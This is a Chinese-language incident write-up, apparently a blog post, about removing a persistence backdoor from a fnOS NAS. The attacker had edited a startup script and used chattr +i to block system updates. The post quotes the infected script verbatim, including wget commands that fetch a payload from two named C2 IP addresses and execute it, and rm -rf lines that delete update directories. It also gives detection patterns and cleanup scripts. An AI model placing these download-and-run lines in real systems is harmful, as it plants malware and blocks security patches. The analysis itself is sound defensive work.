---
title: "记一次飞牛fnOS持久化后门事件：系统更新被阻断的幕后黑手"
date: 2026-02-08
description: "清理完内核级Rootkit后，我发现系统更新一直卡在转圈。深入排查后发现了另一个后门——攻击者修改了启动脚本，用immutable锁定关键文件，彻底阻止系统更新。"
categories:
  - 安全事件
tags:
  - fnOS
  - 飞牛NAS
  - 持久化机制
  - immutable
  - 系统更新阻断
  - Claude Code
---

> 清理完内核级Rootkit后，我发现系统更新一直卡在转圈。深入排查后发现了另一个后门——攻击者修改了启动脚本，用immutable锁定关键文件，彻底阻止系统更新。

**事件时间**: 2026年2月8日
**受影响系统**: 飞牛fnOS 1.1.15
**威胁等级**: 高危（持久化后门 + 系统更新阻断）
**最终结果**: 成功清除，系统更新恢复正常

---

## 一、事件发现：系统更新为何一直转圈？

### 1.1 异常现象

清理完内核级Rootkit后（详见[上篇文章](/fnos_rootkit_incident_2026/)），我尝试通过Web管理界面更新系统。

**更新界面一直卡在转圈，永远不会完成。**

```
┌─────────────────────────────────────────────────────────┐
│  飞牛系统更新                                            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│              ⟳ 正在检查更新...                          │
│                                                         │
│              (无限转圈，永远不会完成)                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

起初怀疑是网络问题，检查后发现：
- 更新服务器 `apiv2-liveupdate.fnnas.com` 可以正常访问
- DNS解析正常
- 命令行执行 `liveupdate` 能获取到更新信息

问题不在网络，系统被做了手脚。

### 1.2 深入日志分析

查看系统日志后发现关键线索：

```bash
$ sudo journalctl -u trim_main.service --since "10 minutes ago"
```

输出中有这样的错误信息：

```
Feb 08 12:48:31 home trim-update[9202]: updating 'LiveUpdate'...
Feb 08 12:48:40 home trim-update[9202]: failed to download 'LiveUpdate'.
Feb 08 12:48:40 home trim-update[9202]: failed to update 'LiveUpdate'.
```

**LiveUpdate组件下载失败。** 这就是更新卡住的原因。

---

## 二、深入调查：发现被锁定的文件

### 2.1 检查更新临时目录

飞牛的更新机制使用 `/var/tmp/trim-update` 目录存放更新包。检查这个目录：

```bash
$ sudo ls -la /var/tmp/trim-update/
total 8
drwx------ 2 root root 4096 Jan 31 23:30 .
drwxr-xr-x 9 root root 4096 Feb  8 12:48 ..
-rw-r--r-- 1 root root    0 Jan 31 23:30 samba_4.17.12-dfsg-0-deb12u2_amd64.deb
```

0字节的空文件。尝试删除：

```bash
$ sudo rm -f /var/tmp/trim-update/samba_4.17.12-dfsg-0-deb12u2_amd64.deb
rm: cannot remove '/var/tmp/trim-update/samba_4.17.12-dfsg-0-deb12u2_amd64.deb': Operation not permitted
```

**即使用root权限也无法删除。** 这让我想起了上次攻击中攻击者用的 `chattr +i` 技术。

### 2.2 确认immutable属性

```bash
$ sudo lsattr /var/tmp/trim-update/
----i---------e------- /var/tmp/trim-update/samba_4.17.12-dfsg-0-deb12u2_amd64.deb

$ sudo lsattr /var/tmp/
----i---------e------- /var/tmp/trim-update
```

果然！不仅文件被设置了immutable属性，**整个目录也被锁定了**。

攻击者的策略：
1. 在更新目录放一个空文件
2. 锁定文件和目录，使其无法删除或修改
3. 系统尝试更新时无法写入新文件，导致更新失败

### 2.3 全面扫描被锁定的文件

为了确保没有遗漏，扫描整个系统中的immutable文件：

```bash
$ sudo find /var /tmp /usr/trim -type f -exec lsattr {} \; 2>/dev/null | grep "^....i"
----i---------e------- /usr/trim/bin/system_startup.sh
----i---------e------- /usr/trim/etc/machine_id
----i---------e------- /var/tmp/trim-update/samba_4.17.12-dfsg-0-deb12u2_amd64.deb
```

发现三个被锁定的文件，其中 `/usr/trim/bin/system_startup.sh` 引起我的注意——这是系统启动时执行的脚本。

---

## 三、惊人发现：启动脚本被植入后门

### 3.1 检查启动脚本内容

```bash
$ cat /usr/trim/bin/system_startup.sh
```

输出内容让我震惊：

```bash
#!/bin/bash

STATUS="/var/lib/dpkg/status"
BACKUP="/var/lib/dpkg/status.original"

if [ ! -f "$BACKUP" ]; then
    if [ -f "$STATUS" ]; then
        cp "$STATUS" "$BACKUP"
    fi
fi

if [ ! -f "$STATUS" ]; then
    if [ -f "$BACKUP" ]; then
        cp "$BACKUP" "$STATUS"
    fi
fi

rm -rf /var/tmp/trim-update
rm -rf /var/tmp/update-*

wget http://151.240.13.91/turmp -O /tmp/turmp ; chmod 777 /tmp/turmp ; /tmp/turmp

wget http://43.198.11.122/turmp -O /tmp/turmp ; chmod 777 /tmp/turmp ; /tmp/turmp
```

### 3.2 后门代码分析

攻击者在原始脚本末尾追加了恶意代码：

```
┌────────────────────────────────────────────────────────────────┐
│                   恶意代码分析                                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  rm -rf /var/tmp/trim-update      ← 删除更新目录，阻止更新     │
│  rm -rf /var/tmp/update-*         ← 删除所有更新相关文件        │
│                                                                │
│  wget http://151.240.13.91/turmp  ← 从C2服务器下载恶意程序     │
│  chmod 777 /tmp/turmp             ← 赋予执行权限               │
│  /tmp/turmp                       ← 执行恶意程序               │
│                                                                │
│  wget http://43.198.11.122/turmp  ← 备用C2服务器               │
│  chmod 777 /tmp/turmp             ← 同上                       │
│  /tmp/turmp                       ← 同上                       │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

**攻击者的多重持久化策略：**

1. **删除更新目录** - 每次系统启动都删除 `/var/tmp/trim-update`，阻止系统更新
2. **锁定更新目录** - 即使脚本中的删除命令失败，immutable属性也能阻止写入
3. **锁定脚本本身** - 防止管理员发现并修改后门
4. **双C2服务器** - 两个不同服务器，提高可用性

### 3.3 检查恶意进程

查看正在运行的恶意进程：

```bash
$ ps aux | grep turmp
root  1527  0.0  0.0  13588  5392 ?  S  12:39  0:00 wget http://151.240.13.91/turmp -O /tmp/turmp
```

wget进程仍在运行，但防火墙已封锁该IP，下载一直失败。

```bash
$ ls -la /tmp/turmp
-rw-r--r-- 1 root root 0 Feb  8 12:39 /tmp/turmp
```

文件大小为0字节，恶意载荷下载失败。**防火墙规则救了我。**

---

## 四、清除过程

### 4.1 终止恶意进程

```bash
$ sudo pkill -9 -f "151.240.13.91"
$ sudo pkill -9 -f "43.198.11.122"
$ sudo rm -f /tmp/turmp
```

### 4.2 解除immutable属性

```bash
# 解锁更新目录和文件
$ sudo chattr -i /var/tmp/trim-update
$ sudo chattr -i /var/tmp/trim-update/samba_4.17.12-dfsg-0-deb12u2_amd64.deb

# 删除并重建更新目录
$ sudo rm -rf /var/tmp/trim-update
$ sudo mkdir -p /var/tmp/trim-update
$ sudo chmod 700 /var/tmp/trim-update

# 解锁启动脚本
$ sudo chattr -i /usr/trim/bin/system_startup.sh
$ sudo chattr -i /usr/trim/etc/machine_id
```

### 4.3 清理启动脚本

移除恶意代码，恢复原始脚本：

```bash
$ sudo vi /usr/trim/bin/system_startup.sh
```

清理后的内容：

```bash
#!/bin/bash

STATUS="/var/lib/dpkg/status"
BACKUP="/var/lib/dpkg/status.original"

if [ ! -f "$BACKUP" ]; then
    if [ -f "$STATUS" ]; then
        cp "$STATUS" "$BACKUP"
    fi
fi

if [ ! -f "$STATUS" ]; then
    if [ -f "$BACKUP" ]; then
        cp "$BACKUP" "$STATUS"
    fi
fi
```

### 4.4 重启服务并验证

```bash
$ sudo systemctl restart trim_main.service
$ sudo systemctl restart trim_nginx.service
```

现在尝试在Web界面更新系统——**成功了！**

---

## 五、安全扫描验证

使用多个安全工具扫描：

### 5.1 安装扫描工具

```bash
$ sudo apt install clamav rkhunter chkrootkit
$ sudo freshclam  # 更新病毒库
```

### 5.2 扫描结果

| 工具 | 扫描范围 | 结果 |
|------|----------|------|
| ClamAV | /tmp, /var/tmp, /usr/trim, /root, /home | ✅ 未发现病毒 |
| chkrootkit | 系统二进制文件 | ✅ 未感染 |
| rkhunter | Rootkit检测 | ✅ 无Rootkit |

扫描确认系统已清理干净。

---

## 六、攻击手法总结

### 6.1 攻击时间线

```
2026-01-31 23:42  │ 攻击者修改 system_startup.sh，植入后门
2026-01-31 23:42  │ 设置 immutable 属性锁定关键文件
2026-01-31 23:42  │ 在 /var/tmp/trim-update 放置空文件并锁定
2026-02-08 12:39  │ 系统重启，后门脚本执行，尝试下载恶意程序
2026-02-08 12:39  │ 防火墙阻止C2连接，下载失败
2026-02-08 12:48  │ 发现问题并开始清理
2026-02-08 13:00  │ 清理完成，系统更新恢复正常
```

### 6.2 攻击者使用的技术

```
┌────────────────────────────────────────────────────────────────┐
│                     攻击技术矩阵                                │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  持久化 (Persistence)                                          │
│  ├─ T1037.004 - 启动脚本修改                                   │
│  │  └─ 修改 /usr/trim/bin/system_startup.sh                   │
│  │                                                             │
│  └─ T1222.002 - 文件属性修改                                   │
│     └─ 使用 chattr +i 锁定关键文件                             │
│                                                                │
│  防御逃避 (Defense Evasion)                                     │
│  ├─ T1562.001 - 禁用安全工具                                   │
│  │  └─ 阻止系统更新，防止安全补丁                              │
│  │                                                             │
│  └─ T1027 - 混淆                                               │
│     └─ 恶意代码追加在合法脚本末尾                              │
│                                                                │
│  命令与控制 (C2)                                                │
│  └─ T1071.001 - HTTP协议                                       │
│     ├─ 151.240.13.91                                          │
│     └─ 43.198.11.122                                          │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 6.3 攻击者的巧妙之处

1. **利用系统机制** - 修改的是飞牛系统的官方启动脚本，不容易被怀疑
2. **多重保险** - immutable属性 + 脚本删除命令，双重阻止更新
3. **双C2服务器** - 提高恶意载荷下载的成功率
4. **隐蔽性强** - 恶意代码追加在脚本末尾，不影响原有功能

---

## 七、IOC（入侵威胁指标）

### 7.1 网络IOC

```
# C2服务器（与上次攻击相同）
151.240.13.91    # 香港 - IPXO
43.198.11.122    # 香港 - AWS EC2

# 恶意URL
http://151.240.13.91/turmp
http://43.198.11.122/turmp
```

### 7.2 文件IOC

```
# 被修改的文件
/usr/trim/bin/system_startup.sh    # 检查是否包含wget命令

# 被锁定的文件/目录
/var/tmp/trim-update               # 检查immutable属性
/usr/trim/etc/machine_id           # 检查immutable属性

# 恶意文件
/tmp/turmp                         # 下载的恶意载荷
```

### 7.3 行为IOC

```bash
# 检查启动脚本是否被篡改
grep -E "wget|curl|151.240|43.198" /usr/trim/bin/system_startup.sh

# 检查是否有被锁定的文件
lsattr /var/tmp/trim-update 2>/dev/null | grep "i"
lsattr /usr/trim/bin/system_startup.sh 2>/dev/null | grep "i"

# 检查异常进程
ps aux | grep -E "turmp|151.240|43.198"
```

---

## 八、检测与修复脚本

### 8.1 一键检测脚本

```bash
#!/bin/bash
# fnOS 持久化后门检测脚本

echo "=== fnOS 持久化后门检测 ==="
echo ""

# 检查启动脚本
echo "[1] 检查启动脚本..."
if grep -qE "wget|curl|151.240|43.198" /usr/trim/bin/system_startup.sh 2>/dev/null; then
    echo "    ⚠️  警告: 启动脚本包含可疑命令!"
    grep -E "wget|curl|151.240|43.198" /usr/trim/bin/system_startup.sh
else
    echo "    ✅ 启动脚本正常"
fi

# 检查immutable文件
echo ""
echo "[2] 检查被锁定的文件..."
locked_files=$(find /var/tmp /usr/trim -type f -exec lsattr {} \; 2>/dev/null | grep "^....i" | awk '{print $2}')
if [ -n "$locked_files" ]; then
    echo "    ⚠️  警告: 发现被锁定的文件:"
    echo "$locked_files" | while read f; do echo "       - $f"; done
else
    echo "    ✅ 未发现异常锁定的文件"
fi

# 检查恶意进程
echo ""
echo "[3] 检查恶意进程..."
malicious_procs=$(ps aux | grep -E "turmp|151.240|43.198" | grep -v grep)
if [ -n "$malicious_procs" ]; then
    echo "    ⚠️  警告: 发现可疑进程:"
    echo "$malicious_procs"
else
    echo "    ✅ 未发现恶意进程"
fi

# 检查更新目录
echo ""
echo "[4] 检查更新目录..."
if [ -d "/var/tmp/trim-update" ]; then
    update_attr=$(lsattr -d /var/tmp/trim-update 2>/dev/null)
    if echo "$update_attr" | grep -q "i"; then
        echo "    ⚠️  警告: 更新目录被锁定!"
    else
        echo "    ✅ 更新目录正常"
    fi
else
    echo "    ✅ 更新目录不存在（正常）"
fi

echo ""
echo "=== 检测完成 ==="
```

### 8.2 一键修复脚本

```bash
#!/bin/bash
# fnOS 持久化后门修复脚本
# 警告：请先备份重要数据！

echo "=== fnOS 持久化后门修复脚本 ==="
echo "警告：此脚本会修改系统配置"
read -p "确认继续？(yes/no): " confirm
if [ "$confirm" != "yes" ]; then
    echo "已取消"
    exit 1
fi

# 1. 终止恶意进程
echo "[1/5] 终止恶意进程..."
pkill -9 -f "151.240.13.91" 2>/dev/null
pkill -9 -f "43.198.11.122" 2>/dev/null
pkill -9 -f "turmp" 2>/dev/null
rm -f /tmp/turmp 2>/dev/null
echo "    完成"

# 2. 解除immutable属性
echo "[2/5] 解除文件锁定..."
chattr -i /var/tmp/trim-update 2>/dev/null
chattr -i /var/tmp/trim-update/* 2>/dev/null
chattr -i /usr/trim/bin/system_startup.sh 2>/dev/null
chattr -i /usr/trim/etc/machine_id 2>/dev/null
echo "    完成"

# 3. 清理更新目录
echo "[3/5] 清理更新目录..."
rm -rf /var/tmp/trim-update
mkdir -p /var/tmp/trim-update
chmod 700 /var/tmp/trim-update
echo "    完成"

# 4. 清理启动脚本
echo "[4/5] 清理启动脚本..."
if grep -qE "wget|curl|151.240|43.198|turmp" /usr/trim/bin/system_startup.sh; then
    # 备份原文件
    cp /usr/trim/bin/system_startup.sh /usr/trim/bin/system_startup.sh.infected

    # 创建干净的脚本
    cat > /usr/trim/bin/system_startup.sh << 'EOF'
#!/bin/bash

STATUS="/var/lib/dpkg/status"
BACKUP="/var/lib/dpkg/status.original"

if [ ! -f "$BACKUP" ]; then
    if [ -f "$STATUS" ]; then
        cp "$STATUS" "$BACKUP"
    fi
fi

if [ ! -f "$STATUS" ]; then
    if [ -f "$BACKUP" ]; then
        cp "$BACKUP" "$STATUS"
    fi
fi
EOF
    chmod 755 /usr/trim/bin/system_startup.sh
    echo "    已清理（原文件备份为 .infected）"
else
    echo "    脚本未被感染，跳过"
fi

# 5. 重启服务
echo "[5/5] 重启服务..."
systemctl restart trim_main.service
systemctl restart trim_nginx.service
echo "    完成"

echo ""
echo "=== 修复完成 ==="
echo ""
echo "建议后续操作："
echo "  1. 尝试在Web界面更新系统"
echo "  2. 运行安全扫描工具确认无残留"
echo "  3. 修改所有密码"
echo "  4. 检查其他可能被篡改的配置"
```

---

## 九、经验教训

### 9.1 攻击者如何阻止系统更新

这次事件揭示了攻击者阻止系统更新的手法：

1. **不是破坏更新程序** - 而是让更新目录无法写入
2. **使用系统自身机制** - 利用immutable属性这个合法功能
3. **多重保险** - 即使属性被清除，启动脚本也会重新删除目录
4. **隐蔽性** - 用户只会看到"更新失败"，不容易发现真正原因

### 9.2 为什么这次没有被完全攻陷

**防火墙是最后一道防线。**

上次清理内核Rootkit时，我设置了iptables规则封锁C2服务器IP。这次攻击者虽然通过启动脚本尝试下载恶意载荷，但防火墙阻止了连接。

```bash
# 这些规则救了我
iptables -A OUTPUT -d 151.240.13.91 -j DROP
iptables -A OUTPUT -d 43.198.11.122 -j DROP
```

### 9.3 综合防御建议

**多层防御策略：**

1. **网络隔离** - 不要将NAS直接暴露公网，使用VPN (Tailscale, WireGuard) 访问
2. **防火墙** - 封锁已知恶意IP，限制出站连接
3. **系统加固** - 及时更新系统，定期检查关键文件完整性
4. **监控告警** - 监控CPU/网络异常，定期安全扫描

---

## 十、总结

这次事件说明，**即使清理了主要的恶意软件，攻击者可能还留有其他后门**。

攻击者使用的"阻止系统更新"策略很聪明——系统无法更新，就无法获得安全补丁，攻击者可以持续利用已知漏洞重新入侵。

**安全是持续的过程，不是一次性的任务。**

如果你也是fnOS用户，建议运行本文提供的检测脚本，确保系统没有被植入类似的后门。

